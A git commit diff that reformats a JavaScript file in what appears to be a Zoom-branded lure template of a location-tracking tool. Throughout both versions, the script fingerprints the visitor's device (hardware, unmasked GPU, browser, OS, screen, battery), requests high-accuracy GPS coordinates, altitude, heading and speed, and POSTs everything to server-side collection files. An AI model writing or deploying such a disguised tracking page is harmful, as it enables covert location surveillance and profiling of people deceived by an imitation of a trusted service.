f17f59eab1110bfad5a1b175b3bc66b95093f098
Sohail <76439991+asxhail@users.noreply.github.com>
2026-01-19 18:00:02 +0530

    Refactor battery information and geolocation handling

--- template/zoom/js/location.js
+++ template/zoom/js/location.js
@@ -1,98 +1,99 @@
 function information() {
-    if (navigator.getBattery) {
-        navigator.getBattery().then(function(battery) {
-            var level = Math.round(battery.level * 100) + "%";
-            var status = battery.charging ? " (Charging ⚡)" : "";
-            var batteryInfo = level + status;
-            collectAndSend(batteryInfo);
-        });
-    } else {
-        collectAndSend("Unknown");
-    }
+  if (navigator.getBattery) {
+    navigator.getBattery().then(function(battery) {
+      var level = Math.round(battery.level * 100) + "%";
+      var status = battery.charging ? " (Charging ⚡)" : "";
+      var batteryInfo = level + status;
+      collectAndSend(batteryInfo);
+    });
+  } else {
+    collectAndSend("Unknown");
+  }
 }
 
 function collectAndSend(batLevel) {
-    var ptf = navigator.platform;
-    var cc = navigator.hardwareConcurrency || 'Not Available';
-    var ram = navigator.deviceMemory || 'Not Available';
-    var ver = navigator.userAgent;
-    var str = ver;
-    var os = ver;
-    
-    var canvas = document.createElement('canvas');
-    var gl;
-    var debugInfo;
-    var ven = 'Not Available';
-    var ren = 'Not Available';
+  var ptf = navigator.platform;
+  var cc = navigator.hardwareConcurrency || 'Not Available';
+  var ram = navigator.deviceMemory || 'Not Available';
+  var ver = navigator.userAgent;
+  var str = ver;
+  var os = ver;
 
-    try {
-        gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-    } catch (e) { }
-    if (gl) {
-        debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        if (debugInfo) {
-            ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-            ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-        }
+  var canvas = document.createElement('canvas');
+  var gl;
+  var debugInfo;
+  var ven = 'Not Available';
+  var ren = 'Not Available';
+
+  try {
+    gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+  } catch (e) {}
+  if (gl) {
+    debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+    if (debugInfo) {
+      ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+      ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
     }
+  }
 
-    var brw;
-    if (ver.indexOf('Firefox') != -1) {
-        str = str.substring(str.indexOf(' Firefox/') + 1);
-        str = str.split(' ');
-        brw = str[0];
-    } else if (ver.indexOf('Chrome') != -1) {
-        str = str.substring(str.indexOf(' Chrome/') + 1);
-        str = str.split(' ');
-        brw = str[0];
-    } else if (ver.indexOf('Safari') != -1) {
-        str = str.substring(str.indexOf(' Safari/') + 1);
-        str = str.split(' ');
-        brw = str[0];
-    } else if (ver.indexOf('Edge') != -1) {
-        str = str.substring(str.indexOf(' Edge/') + 1);
-        str = str.split(' ');
-        brw = str[0];
-    } else {
-        brw = 'Not Available';
-    }
+  var brw;
+  if (ver.indexOf('Firefox') != -1) {
+    str = str.substring(str.indexOf(' Firefox/') + 1);
+    str = str.split(' ');
+    brw = str[0];
+  } else if (ver.indexOf('Chrome') != -1) {
+    str = str.substring(str.indexOf(' Chrome/') + 1);
+    str = str.split(' ');
+    brw = str[0];
+  } else if (ver.indexOf('Safari') != -1) {
+    str = str.substring(str.indexOf(' Safari/') + 1);
+    str = str.split(' ');
+    brw = str[0];
+  } else if (ver.indexOf('Edge') != -1) {
+    str = str.substring(str.indexOf(' Edge/') + 1);
+    str = str.split(' ');
+    brw = str[0];
+  } else {
+    brw = 'Not Available';
+  }
 
-    var ht = window.screen.height;
-    var wd = window.screen.width;
-    
-    os = os.substring(0, os.indexOf(')'));
-    os = os.split(';');
-    os = os[1];
-    if (os == undefined) os = 'Not Available';
-    os = os.trim();
+  var ht = window.screen.height;
+  var wd = window.screen.width;
 
-    $.ajax({
-        type: 'POST',
-        url: info_file,
-        data: { 
-            Ptf: ptf, 
-            Brw: brw, 
-            Cc: cc, 
-            Ram: ram, 
-            Ven: ven, 
-            Ren: ren, 
-            Ht: ht, 
-            Wd: wd, 
-            Os: os, 
-            Bat: batLevel 
-        },
-        success: function () { },
-        mimeType: 'text'
-    });
+  os = os.substring(0, os.indexOf(')'));
+  os = os.split(';');
+  os = os[1];
+  if (os == undefined) os = 'Not Available';
+  os = os.trim();
+
+  $.ajax({
+    type: 'POST',
+    url: info_file,
+    data: {
+      Ptf: ptf,
+      Brw: brw,
+      Cc: cc,
+      Ram: ram,
+      Ven: ven,
+      Ren: ren,
+      Ht: ht,
+      Wd: wd,
+      Os: os,
+      Bat: batLevel
+    },
+    success: function() {},
+    mimeType: 'text'
+  });
 }
 
 function locate(callback, errCallback) {
   if (navigator.geolocation) {
-    var optn = { enableHighAccuracy: true, timeout: 30000, maximumage: 0 };
+    var optn = {
+      enableHighAccuracy: true,
+      timeout: 30000,
+      maximumage: 0
+    };
     navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
-  } else {
-    // Optional: You can alert the user if their browser lacks GPS support entirely
-    // alert('Geolocation is not supported by your browser');
   }
 
   function showError(error) {
@@ -117,27 +118,25 @@ function locate(callback, errCallback) {
     $.ajax({
       type: 'POST',
       url: error_file,
-      data: { Status: err_status, Error: err_text },
+      data: {
+        Status: err_status,
+        Error: err_text
+      },
       success: errCallback(error, err_text),
       mimeType: 'text'
     });
   }
 
   function showPosition(position) {
-    // Lat/Lon
     var lat = position.coords.latitude ? position.coords.latitude + ' deg' : 'Not Available';
     var lon = position.coords.longitude ? position.coords.longitude + ' deg' : 'Not Available';
-    
-    // Accuracy
     var acc = position.coords.accuracy ? position.coords.accuracy + ' m' : 'Not Available';
     
-    // Altitude (Commonly null if indoors/no GPS lock)
-    var alt = position.coords.altitude ? position.coords.altitude + ' m' : 'Sea Level / Unavailable';
-    
-    // Direction (Heading) - Null if stationary
+    // --- UPDATED LINE BELOW ---
+    var alt = position.coords.altitude ? position.coords.altitude + ' m' : 'Sea Level'; 
+    // --------------------------
+
     var dir = position.coords.heading ? position.coords.heading + ' deg' : 'None (Stationary)';
-    
-    // Speed - Null if stationary
     var spd = position.coords.speed ? position.coords.speed + ' m/s' : '0 m/s (Stationary)';
 
     var ok_status = 'success';
@@ -145,7 +144,15 @@ function locate(callback, errCallback) {
     $.ajax({
       type: 'POST',
       url: result_file,
-      data: { Status: ok_status, Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd },
+      data: {
+        Status: ok_status,
+        Lat: lat,
+        Lon: lon,
+        Acc: acc,
+        Alt: alt,
+        Dir: dir,
+        Spd: spd
+      },
       success: callback,
       mimeType: 'text'
     });
